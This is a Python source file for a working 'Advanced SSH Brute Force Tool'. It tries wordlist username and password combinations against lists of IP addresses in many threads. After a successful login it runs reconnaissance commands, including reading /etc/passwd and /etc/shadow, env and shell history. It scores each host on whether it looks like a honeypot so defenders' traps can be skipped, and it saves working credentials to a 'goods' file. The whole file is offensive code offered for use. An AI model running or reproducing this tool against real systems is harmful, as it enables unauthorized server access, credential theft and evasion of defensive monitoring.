#!/usr/bin/env python3
"""
Direct Python port of ssh.go
Advanced SSH Brute Force Tool v2.6
Coded By SudoLite with ❤️
Enhanced Multi-Layer Workers v2.6
No License Required
"""

import sys
import os
import time
import threading
import subprocess
import re
import math
import signal
from datetime import datetime, timedelta
from typing import List, Dict, Set, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import paramiko
import socket

# Constants
VERSION = "2.6"
CONCURRENT_PER_WORKER = 25

# Global variables
start_time = None
total_ip_count = 0
stats = {"goods": 0, "errors": 0, "honeypots": 0}
ip_file = ""
timeout = 0
max_connections = 0
successful_ips = set()
map_mutex = threading.Lock()

@dataclass
class SSHTask:
    IP: str
    Port: str
    Username: str
    Password: str

@dataclass
class ServerInfo:
    IP: str
    Port: str
    Username: str
    Password: str
    IsHoneypot: bool = False
    HoneypotScore: int = 0
    SSHVersion: str = ""
    OSInfo: str = ""
    Hostname: str = ""
    ResponseTime: timedelta = None
    Commands: Dict[str, str] = None
    OpenPorts: List[str] = None

    def __post_init__(self):
        if self.Commands is None:
            self.Commands = {}
        if self.OpenPorts is None:
            self.OpenPorts = []

@dataclass
class HoneypotDetector:
    SuspiciousPatterns: List[str] = None
    TimeAnalysis: bool = True
    CommandAnalysis: bool = True
    NetworkAnalysis: bool = True

    def __post_init__(self):
        if self.SuspiciousPatterns is None:
            self.SuspiciousPatterns = []

def get_items(path: str) -> List[List[str]]:
    """Read items from file, splitting by colon"""
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            items = []
            for line in f:
                line = line.strip()
                if line:
                    items.append(line.split(':'))
            return items
    except Exception as e:
        print(f"Failed to open file: {e}")
        sys.exit(1)

def clear():
    """Clear screen based on OS"""
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Unix/Linux
        os.system('clear')

def create_combo_file(reader):
    """Create combo file from username and password lists"""
    username_file = input("Enter the username list file path: ").strip()
    password_file = input("Enter the password list file path: ").strip()
    
    usernames = get_items(username_file)
    passwords = get_items(password_file)
    
    try:
        with open("combo.txt", 'w', encoding='utf-8') as f:
            for username in usernames:
                for password in passwords:
                    f.write(f"{username[0]}:{password[0]}\n")
    except Exception as e:
        print(f"Failed to create combo file: {e}")
        sys.exit(1)

def gather_system_info(client, server_info: ServerInfo):
    """Gather system information from SSH connection"""
    commands = {
        "hostname": "hostname",
        "uname": "uname -a",
        "whoami": "whoami",
        "pwd": "pwd",
        "ls_root": "ls -la /",
        "ps": "ps aux | head -10",
        "netstat": "netstat -tulpn | head -10",
        "history": "history | tail -5",
        "ssh_version": "ssh -V",
        "uptime": "uptime",
        "mount": "mount | head -5",
        "env": "env | head -10",
    }
    
    for cmd_name, cmd in commands.items():
        output = execute_command(client, cmd)
        server_info.Commands[cmd_name] = output
        
        # Extract specific information
        if cmd_name == "hostname":
            server_info.Hostname = output.strip()
        elif cmd_name == "uname":
            server_info.OSInfo = output.strip()
        elif cmd_name == "ssh_version":
            server_info.SSHVersion = output.strip()
    
    # Scan local ports
    server_info.OpenPorts = scan_local_ports(client)

def execute_command(client, command: str) -> str:
    """Execute command on SSH client"""
    try:
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        if error and not output:
            return f"ERROR: {error.strip()}"
        return output or error
    except Exception as e:
        return f"ERROR: {e}"

def scan_local_ports(client) -> List[str]:
    """Scan local ports using netstat"""
    output = execute_command(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
    ports = []
    
    lines = output.split('\n')
    port_regex = re.compile(r':(\d+)\s')
    
    for line in lines:
        matches = port_regex.findall(line)
        for port in matches:
            if port not in ports:
                ports.append(port)
    
    return ports

def contains(slice_list: List[str], item: str) -> bool:
    """Check if item exists in slice"""
    return item in slice_list

def detect_honeypot(client, server_info: ServerInfo, detector: HoneypotDetector) -> bool:
    """Advanced honeypot detection algorithm (BETA)"""
    honeypot_score = 0
    
    # 1. Analyze suspicious patterns in command output
    honeypot_score += analyze_command_output(server_info)
    
    # 2. Analyze response time
    if detector.TimeAnalysis:
        honeypot_score += analyze_response_time(server_info)
    
    # 3. Analyze file and directory structure
    honeypot_score += analyze_file_system(server_info)
    
    # 4. Analyze running processes
    honeypot_score += analyze_processes(server_info)
    
    # 5. Analyze network and ports
    if detector.NetworkAnalysis:
        honeypot_score += analyze_network(client)
    
    # 6. Behavioral tests
    honeypot_score += behavioral_tests(client, server_info)
    
    # 7. Detect abnormal patterns
    honeypot_score += detect_anomalies(server_info)
    
    # 8. Advanced tests
    honeypot_score += advanced_honeypot_tests(client)
    
    # 9. Performance tests
    honeypot_score += performance_tests(client)
    
    # Record score
    server_info.HoneypotScore = honeypot_score
    
    # Honeypot detection threshold: score 6 or higher
    return honeypot_score >= 6

def analyze_command_output(server_info: ServerInfo) -> int:
    """Analyze command output for suspicious patterns"""
    score = 0
    
    for output in server_info.Commands.values():
        lower_output = output.lower()
        
        # Check specific honeypot patterns
        honeypot_indicators = [
            "fake", "simulation", "honeypot", "trap", "monitor",
            "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
            "/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
        ]
        
        for indicator in honeypot_indicators:
            if indicator in lower_output:
                score += 3
    
    return score

def analyze_response_time(server_info: ServerInfo) -> int:
    """Analyze response time"""
    if server_info.ResponseTime is None:
        return 0
        
    response_time_ms = server_info.ResponseTime.total_seconds() * 1000
    
    # Very fast response time (less than 10 milliseconds) is suspicious
    if response_time_ms < 10:
        return 2
    
    return 0

def analyze_file_system(server_info: ServerInfo) -> int:
    """Analyze file system structure"""
    score = 0
    
    ls_output = server_info.Commands.get("ls_root", "")
    if not ls_output:
        return 0
    
    # Check abnormal structure
    suspicious_patterns = [
        "total 0",           # Empty directory is suspicious
        "total 4",           # Low file count
        "honeypot",          # Explicit name
        "fake",              # Fake files
        "simulation",        # Simulation
    ]
    
    lower_output = ls_output.lower()
    for pattern in suspicious_patterns:
        if pattern in lower_output:
            score += 1
    
    # Low file count in root
    lines = [line for line in ls_output.strip().split('\n') if line.strip()]
    if len(lines) < 5:  # Less than 5 files/directories in root
        score += 1
    
    return score

def analyze_processes(server_info: ServerInfo) -> int:
    """Analyze running processes"""
    score = 0
    
    ps_output = server_info.Commands.get("ps", "")
    if not ps_output:
        return 0
    
    # Suspicious processes
    suspicious_processes = [
        "cowrie", "kippo", "honeypot", "honeyd",
        "artillery", "honeytrap", "glastopf",
        "python honeypot", "perl honeypot",
    ]
    
    lower_output = ps_output.lower()
    for process in suspicious_processes:
        if process in lower_output:
            score += 2
    
    # Low process count
    lines = [line for line in ps_output.strip().split('\n') if line.strip()]
    if len(lines) < 5:
        score += 1
    
    return score

def analyze_network(client) -> int:
    """Analyze network configuration"""
    score = 0
    
    # 1. Check network configuration files
    network_config_check = execute_command(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
    if ("total 0" in network_config_check.lower() or 
        "no such file" in network_config_check.lower() or
        len(network_config_check.strip()) < 10):
        # Missing network configuration files or empty output is suspicious
        score += 1
    
    # 2. Check for fake network interfaces
    interface_check = execute_command(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
    if (any(x in interface_check.lower() for x in ["fake", "honeypot", "trap"]) or
        len(interface_check.strip()) < 10):
        score += 1
    
    # 3. Check routing table for suspicious patterns
    route_check = execute_command(client, "ip route show 2>/dev/null | head -3")
    if len(route_check.strip()) < 20:
        # Very simple or empty routing table is suspicious
        score += 1
    
    return score

def behavioral_tests(client, server_info: ServerInfo) -> int:
    """Behavioral tests"""
    score = 0
    
    # Test 1: Create temporary file
    temp_file_name = f"/tmp/test_{int(time.time())}"
    create_cmd = f"echo 'test' > {temp_file_name}"
    create_output = execute_command(client, create_cmd)
    
    # If unable to create file, it's suspicious
    if ("error" in create_output.lower() or
        "permission denied" in create_output.lower()):
        score += 1
    else:
        # Delete test file
        execute_command(client, f"rm -f {temp_file_name}")
    
    # Test 2: Access to sensitive files
    sensitive_files = ["/etc/passwd", "/etc/shadow", "/proc/version"]
    accessible_count = 0
    
    for file_path in sensitive_files:
        output = execute_command(client, f"cat {file_path} 2>/dev/null | head -1")
        if "error" not in output.lower() and len(output) > 0:
            accessible_count += 1
    
    # If all files are accessible, it's suspicious
    if accessible_count == len(sensitive_files):
        score += 1
    
    # Test 3: Test system commands
    system_commands = ["id", "whoami", "pwd"]
    working_commands = 0
    
    for cmd in system_commands:
        output = execute_command(client, cmd)
        if "error" not in output.lower() and len(output) > 0:
            working_commands += 1
    
    # If no commands work, it's suspicious
    if working_commands == 0:
        score += 2
    
    return score

def advanced_honeypot_tests(client) -> int:
    """Advanced honeypot detection tests"""
    score = 0
    
    # Test 1: Check CPU and Memory
    cpu_info = execute_command(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
    
    if "qemu" in cpu_info.lower() or "virtual" in cpu_info.lower():
        score += 1  # May be a virtual machine
    
    # Test 2: Check kernel and distribution
    kernel_info = execute_command(client, "uname -r")
    
    # Very new or old kernels are suspicious
    if "generic" in kernel_info and len(kernel_info.strip()) < 20:
        score += 1
    
    # Test 3: Check package management
    package_managers = [
        "which apt", "which yum", "which pacman", "which zypper",
    ]
    
    working_pms = 0
    for pm in package_managers:
        output = execute_command(client, pm)
        if "not found" not in output and len(output.strip()) > 0:
            working_pms += 1
    
    # If no package manager exists, it's suspicious
    if working_pms == 0:
        score += 1
    
    # Test 4: Check system services
    services = execute_command(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
    if "0 loaded units" in services or len(services.strip()) < 50:
        score += 1
    
    # Test 5: Check internet access
    internet_test = execute_command(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
    if len(internet_test.strip()) == 0:
        # May not have internet access (suspicious for honeypot)
        score += 1
    
    return score

def performance_tests(client) -> int:
    """Performance and system behavior tests"""
    score = 0
    
    # I/O speed test
    io_test = execute_command(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
    if "command not found" in io_test:
        # Time analysis - if command not found it's suspicious
        score += 1
    
    # Clean up test file
    execute_command(client, "rm -f /tmp/test")
    
    # Internal network test
    network_test = execute_command(client, "ss -tuln 2>/dev/null | wc -l")
    if network_test.strip():
        try:
            count = int(network_test.strip())
            if count < 5:  # Low network connection count
                score += 1
        except ValueError:
            pass
    
    return score

def detect_anomalies(server_info: ServerInfo) -> int:
    """Detect abnormal patterns"""
    score = 0
    
    # Check hostname
    if server_info.Hostname:
        suspicious_hostnames = [
            "honeypot", "fake", "trap", "monitor", "sandbox",
            "test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC",  # Very generic names
        ]
        
        lower_hostname = server_info.Hostname.lower()
        for suspicious in suspicious_hostnames:
            if suspicious in lower_hostname:
                score += 1
    
    # Check uptime
    uptime_output = server_info.Commands.get("uptime", "")
    if uptime_output:
        # If uptime is very low (less than 1 hour) or command not found, it's suspicious
        if ("0:" in uptime_output or 
            "min" in uptime_output.lower() or 
            "command not found" in uptime_output.lower()):
            score += 1
    
    # Check command history
    history_output = server_info.Commands.get("history", "")
    if history_output:
        lines = [line for line in history_output.strip().split('\n') if line.strip()]
        # Very little or empty history
        if len(lines) < 3:
            score += 1
    
    return score

def log_successful_connection(server_info: ServerInfo):
    """Log successful connection"""
    success_message = f"{server_info.IP}:{server_info.Port}@{server_info.Username}:{server_info.Password}"
    
    # Save to main file
    append_to_file(success_message + "\n", "su-goods.txt")
    
    # Save detailed information to separate file
    detailed_info = f"""
=== 🎯 SSH Success 🎯 ===
🌐 Target: {server_info.IP}:{server_info.Port}
🔑 Credentials: {server_info.Username}:{server_info.Password}
🖥️ Hostname: {server_info.Hostname}
🐧 OS: {server_info.OSInfo}
📡 SSH Version: {server_info.SSHVersion}
⚡ Response Time: {server_info.ResponseTime}
🔌 Open Ports: {server_info.OpenPorts}
🍯 Honeypot Score: {server_info.HoneypotScore}
🕒 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
========================
"""
    
    append_to_file(detailed_info, "detailed-results.txt")
    
    # Display success message in console
    print(f"✅ SUCCESS: {success_message}")

def append_to_file(data: str, filepath: str):
    """Append data to file"""
    try:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(data)
    except Exception as e:
        print(f"Failed to write to file: {e}")

def format_time(seconds: float) -> str:
    """Format time in DD:HH:MM:SS format"""
    days = int(seconds) // 86400
    hours = (int(seconds) % 86400) // 3600
    minutes = (int(seconds) % 3600) // 60
    seconds = int(seconds % 60)
    return f"{days:02d}:{hours:02d}:{minutes:02d}:{seconds:02d}"

def calculate_optimal_buffers() -> int:
    """Calculate optimal buffer sizes based on worker capacity"""
    # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
    task_buffer = int(float(max_connections * CONCURRENT_PER_WORKER) * 1.5)
    return task_buffer

def banner():
    """Display banner with statistics"""
    while True:
        # Use atomic operations for thread-safe reading
        goods = stats["goods"]
        errors = stats["errors"]
        honeypots = stats["honeypots"]
        
        total_connections = goods + errors + honeypots
        elapsed_time = time.time() - start_time
        connections_per_second = float(total_connections) / elapsed_time if elapsed_time > 0 else 0
        estimated_remaining_time = float(total_ip_count - total_connections) / connections_per_second if connections_per_second > 0 else 0

        clear()

        print("================================================")
        print(f"🚀 Advanced SSH Brute Force Tool v{VERSION} 🚀")
        print("================================================")
        print(f"📁 File: {ip_file} | ⏱️  Timeout: {timeout}s")
        print(f"🔗 Max Workers: {max_connections} | 🎯 Per Worker: {CONCURRENT_PER_WORKER}")
        print("================================================")
        print(f"🔍 Checked SSH: {total_connections}/{total_ip_count}")
        print(f"⚡ Speed: {connections_per_second:.2f} checks/sec")
        
        if total_connections < total_ip_count:
            print(f"⏳ Elapsed: {format_time(elapsed_time)}")
            print(f"⏰ Remaining: {format_time(estimated_remaining_time)}")
        else:
            print(f"⏳ Total Time: {format_time(elapsed_time)}")
            print("✅ Scan Completed Successfully!")
        
        print("================================================")
        print(f"✅ Successful: {goods}")
        print(f"❌ Failed: {errors}")
        print(f"🍯 Honeypots: {honeypots}")
        
        if total_connections > 0:
            # Calculate rates based on successful connections (goods + honeypots)
            successful_connections = goods + honeypots
            if successful_connections > 0:
                print(f"📊 Success Rate: {(float(goods)/float(successful_connections))*100:.2f}%")
                print(f"🍯 Honeypot Rate: {(float(honeypots)/float(successful_connections))*100:.2f}%")
        
        print("================================================")
        print(f"| 💻 Coded By SudoLite with ❤️  |")
        print(f"| 🔥 Enhanced Multi-Layer Workers v{VERSION} 🔥 |")
        print(f"| 🛡️  No License Required 🛡️   |")
        print("================================================")

        if total_connections >= total_ip_count:
            break
        time.sleep(0.5)

def setup_enhanced_worker_pool(combos: List[List[str]], ips: List[List[str]]):
    """Enhanced worker pool system"""
    # Calculate optimal buffer sizes using enhanced algorithm
    task_buffer_size = calculate_optimal_buffers()
    
    # Create channels with calculated buffer sizes
    task_queue = []
    
    # Generate and send tasks
    for combo in combos:
        for ip in ips:
            task = SSHTask(
                IP=ip[0],
                Port=ip[1],
                Username=combo[0],
                Password=combo[1],
            )
            task_queue.append(task)
    
    # Start progress banner
    banner_thread = threading.Thread(target=banner, daemon=True)
    banner_thread.start()
    
    # Process tasks with thread pool
    with ThreadPoolExecutor(max_workers=max_connections) as executor:
        futures = []
        for task in task_queue:
            future = executor.submit(process_ssh_task, task)
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in futures:
            future.result()

def process_ssh_task(task: SSHTask):
    """Process individual SSH task"""
    # SSH connection configuration
    config = paramiko.SSHClient()
    config.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    connection_start_time = time.time()
    
    try:
        # Test connection
        config.connect(
            hostname=task.IP,
            port=int(task.Port),
            username=task.Username,
            password=task.Password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False
        )
        
        # Create server information
        server_info = ServerInfo(
            IP=task.IP,
            Port=task.Port,
            Username=task.Username,
            Password=task.Password,
            ResponseTime=timedelta(seconds=(time.time() - connection_start_time)),
        )
        
        # Honeypot detector
        detector = HoneypotDetector(
            TimeAnalysis=True,
            CommandAnalysis=True,
            NetworkAnalysis=True,
        )
        
        # Gather system information first
        gather_system_info(config, server_info)
        
        # Run full honeypot detection (all 9 algorithms) with valid client
        server_info.IsHoneypot = detect_honeypot(config, server_info, detector)
        
        # Record result
        success_key = f"{server_info.IP}:{server_info.Port}"
        with map_mutex:
            if success_key not in successful_ips:
                successful_ips.add(success_key)
                if not server_info.IsHoneypot:
                    stats["goods"] += 1
                    log_successful_connection(server_info)
                else:
                    stats["honeypots"] += 1
                    print(f"🍯 Honeypot detected: {server_info.IP}:{server_info.Port} (Score: {server_info.HoneypotScore})")
                    append_to_file(f"HONEYPOT: {server_info.IP}:{server_info.Port}@{server_info.Username}:{server_info.Password} (Score: {server_info.HoneypotScore})\n", "honeypots.txt")
        
        config.close()
        
    except Exception as e:
        # Error handling
        stats["errors"] += 1

def main():
    """Main function"""
    global start_time, total_ip_count, ip_file, timeout, max_connections
    
    create_combo_file(None)
    ip_file = input("Enter the IP list file path: ").strip()
    
    timeout = int(input("Enter the timeout value (seconds): "))
    max_connections = int(input("Enter the maximum number of workers: "))
    
    start_time = time.time()
    
    combos = get_items("combo.txt")
    ips = get_items(ip_file)
    total_ip_count = len(ips) * len(combos)
    
    # Enhanced worker pool system
    setup_enhanced_worker_pool(combos, ips)
    
    print("Operation completed successfully!")

if __name__ == "__main__":
    main()
